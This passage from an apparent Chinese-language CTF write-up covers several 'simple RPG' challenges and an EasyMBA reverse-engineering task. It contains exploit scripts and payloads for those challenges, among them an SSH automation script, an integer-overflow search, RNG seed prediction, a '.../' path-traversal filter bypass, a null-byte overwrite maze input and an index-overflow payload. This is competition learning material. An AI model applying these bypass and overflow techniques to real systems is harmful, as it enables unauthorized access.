class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">    b()</span><br><span class="line">    data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">    b()</span><br><span class="line"></span><br><span class="line">    fail = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    level = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> level &lt; <span class="number">10</span> <span class="keyword">and</span> fail &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="comment">#print(f&#x27;&#123;fail=&#125;&#x27;)</span></span><br><span class="line">        <span class="comment">#print(f&#x27;&#123;level=&#125;,direction=&#123;n2d[direction[level]]&#125;&#x27;)</span></span><br><span class="line">        s.send(n2d[direction[level]])</span><br><span class="line">        b()</span><br><span class="line"></span><br><span class="line">        data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        b()</span><br><span class="line">        <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(isCorrect(data))</span></span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(isCorrect(data)):</span><br><span class="line">            <span class="comment">#print(f&#x27;d[&#123;level&#125;]=&#123;n2d[direction[level]]&#125;&#x27;)</span></span><br><span class="line">            level+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fail+=<span class="number">1</span></span><br><span class="line">            <span class="comment">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            s.send(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            b()</span><br><span class="line">            s.recv(n)</span><br><span class="line">            <span class="comment">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">            b()</span><br><span class="line">            <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">            direction[level] = (direction[level]+<span class="number">1</span>)%<span class="number">4</span></span><br><span class="line">    <span class="built_in">print</span>(level)</span><br><span class="line">    <span class="keyword">return</span> fail &lt; <span class="number">3</span></span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">begin()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> stage2():</span><br><span class="line">    <span class="comment">#ssh = paramiko.SSHClient()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span></span><br><span class="line">    ssh.close()</span><br><span class="line">    ssh.connect(<span class="string">&#x27;111.186.57.85&#x27;</span>,<span class="number">40150</span>,<span class="string">&#x27;guest&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    s = ssh.invoke_shell(width=<span class="number">181</span>,height=<span class="number">58</span>)</span><br><span class="line">    begin()</span><br><span class="line">data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">getFlag(data)</span><br><span class="line">data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">getFlag(data)</span><br><span class="line">data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">getFlag(data)</span><br><span class="line">ssh.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="简单的RPG2"><a href="#简单的RPG2" class="headerlink" title="简单的RPG2"></a>简单的RPG2</h3><p>溢出 cost会变小</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> num = (<span class="number">1</span>&lt;&lt;<span class="number">16</span>)/<span class="number">50</span> ;num&lt;=<span class="number">99999999</span>;num++)&#123;</span><br><span class="line">		<span class="type">int</span> cost = num*<span class="number">50</span>;</span><br><span class="line">		<span class="keyword">if</span>(cost &gt; <span class="number">0</span> &amp;&amp; cost &lt; <span class="number">10000</span>)&#123;</span><br><span class="line">			std::cout&lt;&lt;num&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;cost&lt;&lt;std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">				</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="简单的RPG3"><a href="#简单的RPG3" class="headerlink" title="简单的RPG3"></a>简单的RPG3</h3><p>随机种子是time&#x2F;10 10s重置一次 且是stage3函数开始的时候，所以只要用另一台时区一致的机器跑一样的代码即可</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> tab[<span class="number">4</span>]=&#123;<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;D&#x27;</span>&#125;;</span><br><span class="line">        <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>)/<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">10</span> ;i++)&#123;</span><br><span class="line">                std::cout&lt;&lt;tab[<span class="built_in">rand</span>()%<span class="number">4</span>]&lt;&lt;<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="简单的RPG4"><a href="#简单的RPG4" class="headerlink" title="简单的RPG4"></a>简单的RPG4</h3><p>ida 逆向</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%48s&quot;</span>,s1);</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">memcmp</span>(s1,<span class="string">&quot;your_deck/&quot;</span>,<span class="number">0xA</span>uLL));</span><br><span class="line"><span class="keyword">for</span>(dest = s1; <span class="built_in">strcpy</span>(dest,dest+<span class="number">1</span>))&#123;</span><br><span class="line">    dest = <span class="built_in">strstr</span>(dest,<span class="string">&quot;../&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!dest)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只能用your_deck 且过滤了..&#x2F;<br>但实际上每次过滤之后dest会直接移动一个位置，因此<code>.../</code>会被替换为<code>../</code> 然后找一个攻击力更高的就行了 （前两个byte）</p>
<h3 id="简单的RPG5"><a href="#简单的RPG5" class="headerlink" title="简单的RPG5"></a>简单的RPG5</h3><p>一个表面上走不通的迷宫<br>两个迷惑的地方</p>
<ol>
<li>为什么输入和迷宫数据用的是同一个地址？</li>
<li>为什么迷宫信息需要用那么复杂的方式？</li>
</ol>
<p>分别对应的利用点：</p>
<ol>
<li>scanf %s 最后会补\0 导致覆盖1个byte的数据</li>
<li>表面上是用一个bit存数据 节省空间 实际上覆盖1个byte的数据足以改变8个迷宫格子 打造一条通路</li>
</ol>
<p>exp:<code>wddddddsddddddddssddddwwddssssaassssddssddwwddwwaawwddddwwddwwddddddddssssssddssssaassssddssssssaaaaaaaaaaaaaassssssssssaaaaaassssssssddssssaassssddssddddddddddddddwwddddddddssddddddwwddddddssddddddddwwwwddddssddssddddwwwwwwwwddddssddssssssddddwwddddddddddddddssdd00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></p>
<h3 id="简单的RPG6"><a href="#简单的RPG6" class="headerlink" title="简单的RPG6"></a>简单的RPG6</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> v12[<span class="number">128</span>];<span class="comment">//[rsp+70h]</span></span><br><span class="line"><span class="type">unsigned</span> int8 v13;<span class="comment">//[rsp+F0h]</span></span><br><span class="line"><span class="type">char</span> v14;<span class="comment">//[rsp+F1h]</span></span><br></pre></td></tr></table></figure>
<p>v12[128] &#x3D;&#x3D; v13<br>v12[129] &#x3D;&#x3D; v14<br>目标是让v13变成129 这样直接拿v14的值比 和随机数无关<br><code>[&gt;&gt;&lt;+]</code>靠[]让v13循环加到127，然后v12[v13]加到溢出到0停止循环<br><code>&gt;+</code>v13加到129<br><code>.</code>让v5是1<br>payload：<code>+[&gt;&gt;&lt;+]&gt;+.</code></p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="EasyMBA"><a href="#EasyMBA" class="headerlink" title="EasyMBA"></a>EasyMBA</h3><p>简单位运算的方程<br>由于位运算的高位不会对低位产生影响 所以可以看成是每个bit的方程 这个方程一阶命题逻辑方程，可能多解，也可能无解。多解情况下可以回溯。<br>这里用unsigned int 模拟每个寄存器 然后用运算符翻译一下汇编的指令，模拟之后一个个bit枚举即可。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">checker1 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2833100173</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-0x9c68db12=0xc74d27b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checker2</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//79606647</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> a = <span class="number">0x50994505</span> ;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> b = <span class="number">0x57B0131A</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ans = ~a-b;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">32</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i==<span class="number">8</span>)std::cout&lt;&lt;x&lt;&lt;std::endl;</span><br><span class="line">		<span class="keyword">if</span>((((x&amp;<span class="number">0x5427F672</span>)+(x&amp;<span class="number">0x5427F672</span>)+(x&amp;<span class="number">0x5427F672</span>)+ ~(x | <span class="number">0xABD8098D</span>)+<span class="number">1</span> + ~x+<span class="number">1</span>) &amp; (<span class="number">1</span>&lt;&lt;i))== (ans &amp; (<span class="number">1</span>&lt;&lt;i)))&#123;</span><br><span class="line">	</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			x |= (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">			std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(ans &amp; (<span class="number">1</span>&lt;&lt;i))&lt;&lt;std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout&lt;&lt;x&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;((x&amp;<span class="number">0x5427F672</span>)+(x&amp;<span class="number">0x5427F672</span>)+(x&amp;<span class="number">0x5427F672</span>)+ ~(x | <span class="number">0xABD8098D</span>)+<span class="number">1</span> + ~x+<span class="number">1</span>)&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;ans&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">checker3_check</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> x,<span class="type">int</span> i)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ans = <span class="number">0x2334EB06</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> eax = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> edx = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ecx = <span class="number">0</span>;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax  = ~eax;</span><br><span class="line">	eax |=  <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	ecx = edx;</span><br><span class="line">	ecx -= eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax |= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	eax += edx;</span><br><span class="line">	edx = eax+ecx;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax &amp;= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	ecx = eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax |= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	eax = eax;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax +=eax;</span><br><span class="line">	eax += ecx;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	edx += eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax ^= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	ecx = eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax &amp;= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	eax *= (<span class="number">-0xa</span>);</span><br><span class="line">	eax += ecx;</span><br><span class="line">	edx -= eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	</span><br><span class="line">			</span><br><span class="line">	<span class="comment">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class="line">	<span class="keyword">return</span> (eax &amp; (<span class="number">1</span>&lt;&lt;i)) == (ans &amp; (<span class="number">1</span>&lt;&lt;i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checker3</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//84381514</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">32</span> ;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">checker3_check</span>(x,i))&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		x |= (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">checker3_check</span>(x,i))&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			std::cout&lt;&lt;<span class="string">&quot;cant find answer&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout&lt;&lt;x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">checker4_check</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> x,<span class="type">int</span> i)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ans = <span class="number">0xDE2B3E84</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> eax = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> edx = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ecx = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> esi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> edi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rdi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rsi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rax = <span class="number">0</span>;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax ^= <span class="number">0xE76EDA24</span>;</span><br><span class="line">	eax = eax;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	eax +=  edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	edx += eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax |= <span class="number">0xE76EDA24</span>;</span><br><span class="line">	eax = eax;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	ecx = edx + eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax &amp;= <span class="number">0xE76EDA24</span>;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	eax += edx;</span><br><span class="line">	eax += eax;</span><br><span class="line"></span><br><span class="line">	esi  = eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax |= <span class="number">0xE76EDA24</span>;</span><br><span class="line">	eax = eax;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	</span><br><span class="line">	eax += edx;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	eax += esi;</span><br><span class="line">	ecx -= eax;</span><br><span class="line">	edx = x;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	eax += edx;</span><br><span class="line">	eax = -eax;</span><br><span class="line">	edx = x;</span><br><span class="line">	edx |= <span class="number">0xCD731B78</span>;</span><br><span class="line">	</span><br><span class="line">	edx = edx;</span><br><span class="line">	edx = ~edx;</span><br><span class="line">	edx += edx;</span><br><span class="line">	eax -= edx;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax |= <span class="number">0x328CE487</span>;</span><br><span class="line">	esi = edx;</span><br><span class="line">	esi -= eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax &amp;= <span class="number">0xCD731B78</span>;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	eax += edx;</span><br><span class="line">	edx = esi+eax;</span><br><span class="line">	<span class="comment">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class="line">	eax = x;</span><br><span class="line">	</span><br><span class="line">	rsi = <span class="number">0xFFFFFFFF328CE487</span>;</span><br><span class="line">	rax |= eax;</span><br><span class="line">	rsi |= rax;</span><br><span class="line">	eax = x;</span><br><span class="line">	rax = x;</span><br><span class="line">	</span><br><span class="line">	rdi = <span class="number">0xFFFFFFFF328CE487</span>;</span><br><span class="line">	rax |= eax;</span><br><span class="line">	rdi &amp;= rax;</span><br><span class="line">	</span><br><span class="line">	eax = <span class="number">0</span>;</span><br><span class="line">	rax = <span class="number">0</span>;</span><br><span class="line">	rax -=rdi;</span><br><span class="line">	rax += rax;</span><br><span class="line">	</span><br><span class="line">	rsi -= rax;</span><br><span class="line">	rax = rsi;</span><br><span class="line">	esi = rsi &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">	eax = rax &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">	esi = eax;</span><br><span class="line">	eax = <span class="number">0</span>;</span><br><span class="line">	eax -= esi;</span><br><span class="line">	eax += eax;</span><br><span class="line">	edx -= eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += ecx;</span><br><span class="line">	eax += <span class="number">0x189125DA</span>;</span><br><span class="line">	</span><br><span class="line">			</span><br><span class="line">	<span class="comment">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class="line">	<span class="keyword">return</span> (eax &amp; (<span class="number">1</span>&lt;&lt;i)) == (ans &amp; (<span class="number">1</span>&lt;&lt;i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checker4</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//69863554</span></span><br><span class="line">	std::stack&lt;<span class="type">int</span>&gt; try_stack;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">32</span> ;i++)&#123;</span><br><span class="line">		<span class="type">bool</span> use0 = <span class="built_in">checker4_check</span>(x,i);</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> xx = x | (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">		<span class="type">bool</span> use1 = <span class="built_in">checker4_check</span>(xx,i);</span><br><span class="line">		<span class="keyword">if</span>(use0 &amp; !use1)&#123;</span><br><span class="line">			std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot;:0&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(use1 &amp; !use0)&#123;</span><br><span class="line">	